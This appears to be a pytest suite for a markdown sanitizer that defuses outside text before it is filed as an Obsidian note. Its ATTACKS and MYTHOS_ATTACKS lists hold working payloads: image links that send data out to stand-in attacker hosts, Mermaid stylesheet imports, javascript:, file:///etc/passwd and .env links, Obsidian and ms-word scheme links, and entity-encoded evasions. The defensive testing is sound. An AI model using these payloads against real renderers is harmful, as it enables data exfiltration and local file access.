"""Tests for output_sanitizer.sanitize_report, the shared defuser for outside
text filed as a note.

The first half is ported from the weekly reports job's own tests (the review
rounds of 2026-10-16); the rest covers the 2026-10-20 additions: Mermaid
fences and directives (5268556), schemes spelled with entities or escapes
(5268416), the click-to-dial schemes (MDASH weekly:388), and the converters'
own embeds (sanitize_keeping_embeds).

The rendered result is what matters: after cleaning, no image opener, tag
opener or non-web scheme may survive in any position. The helpers here say
so without parsing markdown, which is the point of the design.
"""
from __future__ import annotations

import html
import re
from pathlib import Path

import pytest

import output_sanitizer as o

S = o.sanitize_report
Z = "\u200b"

LIVE_IMAGE = re.compile(r"!\[")
LIVE_TAG = re.compile(r"<[A-Za-z/!?]")
_ESCAPE = re.compile(r"\\([!-/:-@\[-`{-~])")


def _schemes_in(t):
    outside = re.sub(r"https?://[^\s<>\"'`()\[\]]*", " ", t, flags=re.I)
    found = re.findall(r"(?<![A-Za-z0-9+.\-])([A-Za-z][A-Za-z0-9+.\-]*)"
                       r"(?::|&#0*58;?|&#[xX]0*3[aA];?|&colon;|\\:)"
                       r"(?!\*+(?:[ \t\r\n\f\v]|$))([^ \t\r\n\f\v])", outside)
    live = []
    for name, nxt in found:
        n = name.lower()
        if n in ("http", "https"):
            continue
        if nxt in "0123456789" and n not in o._ALWAYS_DEFUSE and not n.startswith("ms-"):
            continue
        live.append(name)
    return live


def live_schemes(t):
    """Non-web schemes still followed by a colon (in any spelling) and then
    anything but ASCII whitespace, a closing bold run, or (for schemes that
    only act on a click) a digit -- in the text as written and as a renderer
    decodes it (entities, backslash escapes)."""
    return _schemes_in(t) + _schemes_in(html.unescape(_ESCAPE.sub(r"\1", t)))


def live_mermaid(t):
    """A fence whose language, decoded and trimmed, is mermaid."""
    for fence in re.finditer(r"(?:`{3,}|~{3,})([^\r\n`~]*)", t):
        lang = html.unescape(_ESCAPE.sub(r"\1", fence.group(1))).strip().lower()
        if lang.startswith("mermaid"):
            return True
    return False


def inert(t):
    return not LIVE_IMAGE.search(t) and not LIVE_TAG.search(t) \
        and not live_schemes(t) and not live_mermaid(t)


ATTACKS = [
    # images and HTML, including the confirmation pass's backtick shield
    "a ![x](https://evil.example/p?d=SECRET) b ![r][1]\n[1]: https://evil.example/q?d=1",
    'x <img src="https://evil.example/a?d=1"> <iframe src=y></iframe> <svg onload=1>',
    "use the ` key\n\nmore\n\n![x](https://evil.example/i.png?d=s)\n\n<img src=https://evil.example/i2.png>\n\nend with `",
    "```inline``` text ![x](https://evil.example/a)\n<img src=x>",
    "````\ncode\n```\n![x](https://evil.example/a)\n<img src=x>",
    # schemes, every form either round found
    "[go](obsidian://advanced-uri?commandid=x)", "[go](obsidian:open?vault=v)",
    "[f](file:///etc/passwd)", "[j](javascript:alert(1))",
    "[d](ms-word:ofe|u|https://evil.example/d.docx)",
    "[e](obsidian&#58;//advanced-uri?x)", "[e](obsidian&#x3A;//open)", "[e](obsidian&colon;open)",
    "[b](obsidian\\://open)", "[u](OBSIDIAN://open)", "[s]( <obsidian://open> )",
    "[x](< obsidian:open>)", "[x](<\tms-word:ofe|u|https://evil.example/x>)",
    "> [r]: ms-word:ofe|u|https://evil.example/x.docx", "- [r]: obsidian:open?vault=v",
    "[r]:\n  ms-word:ofe|u|https://evil.example/x", "[a\\](b](ms-word:ofe|u|https://evil.example/x.docx)",
    "[r]: obsidian&#x3A;//open?vault=v \"title\"", "<obsidian://open?vault=v> bare obsidian://open",
    "[x](obsi&#100;ian:open)",
    # the narrow pass (C1, C2, P1)
    "![[x](https://evil.example/i.png)](https://evil.example/i.png?d=secret)",
    "![[](https://evil.example/i.png)](https://evil.example/i.png)", "![[a](https://evil.example/i.png?d=s)",
    "[x](obsidian:\u00a0//open?vault=v)", "[x](ms-word:\u2003ofe|u|https://e.example/a.docx)",
    "[x](obsidian:*//open)", "[x](ms-word:*ofe|u|https://e.example/a)",
    "[x](javascript:1;alert(1))", "[x](obsidian:1)", "[x](ms-word:1)",
]

# F-20261020 work-D/repro_weekly.py: every case it showed passing unchanged.
MYTHOS_ATTACKS = [
    '```mermaid\nflowchart LR\n  A@{ img: "https://attacker.example/i.png?d=SECRET", label: "x" }\n```',
    '```mermaid\n%%{init: {"themeCSS": "@import url(https://attacker.example/c.css);"}}%%\ngraph TD; A-->B\n```',
    "[x](obsidia&#110;://new?vault=Obsidian&file=K&content=x&overwrite=true)",
    "[x](javascrip&#116;:alert(1))",
    "[d](ms-wor&#100;:ofe|u|https://attacker.example/x.docx)",
    "[f](fil&#101;:///Users/x/.env)",
    "[r]: obsidian-dashboar&#100;://run/pull-meetings",
    "[x](obsidian&colon;//open?file=x)",
    "[x](javascript&#58;alert(1))",
    "[x](&#111;bsidian://open)",
    "[dial](tel:15551212)",
    "[sms](sms:1?body=hi)",
    # the same classes, other spellings
    "[x](obsidian\\-dashboard://run/x)", "[x](&#x6F;bsidian://open)",
    "[x](javascrip&#x74;&#58;alert(1))", "[c](facetime:15551212)", "[c](callto:15551212)",
    "~~~Mermaid\nA@{ img: \"https://attacker.example/i.png\" }\n~~~",
    "> ```  mermaid\n> A\n> ```", "- ```&#109;ermaid\n  A\n  ```",
    "```\u00a0MERMAID\nA\n```",
    "```x&#10;language-mermaid\nA\n```",
]


def test_every_known_attack_is_inert():
    for case in ATTACKS + MYTHOS_ATTACKS:
        t, c = S(case)
        assert inert(t), (case, t)
        assert sum(c.values()) >= 1, case


def test_old_code_spans_no_longer_shield():
    t, _ = S("`a\n\n![x](https://e.example/a)\n\nb`")
    assert inert(t)


def test_web_links_and_prose_kept_whole():
    """Citations, anchors, queries, footnotes, times and prose are untouched."""
    src = ("[v](https://www.youtube.com/watch?v=abc#t=30) [h](https://news.example/item?id=7) "
           "[a](https://www.nist.gov/x#sec) https://en.example.org/wiki/File:X.png "
           "https://e.example/T10:30\n[^1]: Example Corp: a note.\n"
           "[^2]: [T](https://example.com/n) — Example Corp, 2026. At 02:00, ratio 3:1.\n"
           "[[Local Note]] **Microsoft:** text, **Google:**\n"
           "`ollama run llama3.1:8b` on localhost:8080, qwen2.5:7b at 10:30\n"
           "AT&amp;T and R&D: up 5%, Q&A: see https://e.example/a?b=1&c=2\n"
           "```python\nprint(1)\n```\n")
    t, c = S(src)
    assert t == src and sum(c.values()) == 0


def test_clean_report_unchanged():
    clean = "---\ntitle: t\n---\n# H\n\nText.[^1]\n\n[^1]: [T](https://www.nist.gov/x?y=1) — NIST, 2026-10-01.\n"
    t, c = S(clean)
    assert t == clean and sum(c.values()) == 0


def test_local_embeds_are_defused_too():
    """No exemption for "![[": CommonMark reads "![[x](u)](u2)" as an image."""
    t, c = S("![[Embed]] and ![[x](https://e.example/a)](https://e.example/b)")
    assert inert(t) and c["images"] == 2


# ---- 2026-10-20 additions ---------------------------------------------------

def test_mermaid_fence_gets_the_space_before_its_language():
    t, c = S("```mermaid\ngraph TD; A-->B\n```")
    assert t == "```" + Z + "mermaid\ngraph TD; A-->B\n```" and c["diagrams"] == 1


def test_directive_stylesheet_import_is_broken():
    t, c = S('%%{init: {"themeCSS": "@import url(https://attacker.example/c.css);"}}%%')
    assert "theme" + Z + "CSS" in t and "@" + Z + "import" in t and c["diagrams"] == 2


def test_themecss_in_a_yaml_config_block_is_broken():
    t, _ = S("---\nconfig:\n  themeCSS: \"x\"\n---")
    assert "theme" + Z + "CSS" in t


def test_entity_scheme_space_lands_after_the_scheme_in_the_original():
    """The original spelling is kept; the space goes just before the colon,
    so the decoded scheme reads "obsidian<ZWSP>" and is no scheme at all."""
    t, c = S("[x](obsidia&#110;://open)")
    assert t == "[x](obsidia&#110;" + Z + "://open)" and c["schemes"] == 1


def test_click_to_dial_schemes_are_defused_although_a_digit_follows():
    # skype, sip, sips: review R10 (2026-10-26).
    for s in ("tel", "sms", "facetime", "facetime-audio", "callto", "skype", "sip", "sips"):
        t, c = S("[d](%s:15551212)" % s)
        assert t == "[d](%s%s:15551212)" % (s, Z) and c["schemes"] == 1, s


def test_entities_inside_web_urls_and_prose_are_left_alone():
    src = "[a](https://e.example/q?x=1&amp;y=obsidian:2) and &#8212; then &amp; done"
    t, c = S(src)
    assert t == src and sum(c.values()) == 0


def test_idempotent():
    for case in ATTACKS + MYTHOS_ATTACKS:
        once, _ = S(case)
        twice, c = S(once)
        assert twice == once and sum(c.values()) == 0, case


def test_keeping_embeds_restores_only_the_named_ones():
    src = ("![[doc-img-1.png]]\n\n![[other.png]]\n"
           "![[doc-img-1.png]](https://attacker.example/i.png)\n"
           "![x](https://attacker.example/a.png)")
    t, c = o.sanitize_keeping_embeds(src, ["doc-img-1.png"])
    assert t.startswith("![[doc-img-1.png]]\n\n!" + Z + "[[other.png]]\n")
    # followed by "(", it is a CommonMark remote image: stays defused
    assert "!" + Z + "[[doc-img-1.png]](https://attacker" in t
    assert "!" + Z + "[x](" in t
    assert c["images"] == 3


# ---- the public writers that use it -----------------------------------------
#
# Each writes outside text into a note: the call must stay, before the
# templater_guard pass. A new writer of outside text belongs here too.

_ROOT = Path(__file__).resolve().parents[3]
SANITIZED_WRITERS = {
    "installers/lib/drift_review.py": "neutralize(sanitize(text))",
    "Templates/Scripts/meeting_group_backfill.py": "sanitize_report(subject)",
    "Templates/Scripts/markitdown_convert.py": "output_sanitizer.sanitize_keeping_embeds(",
    "Templates/Scripts/markitdown_dropper.py": "output_sanitizer.sanitize_keeping_embeds(",
}


@pytest.mark.parametrize("path", sorted(SANITIZED_WRITERS))
def test_writer_sanitizes(path):
    src = (_ROOT / path).read_text(encoding="utf-8")
    assert SANITIZED_WRITERS[path] in src, path
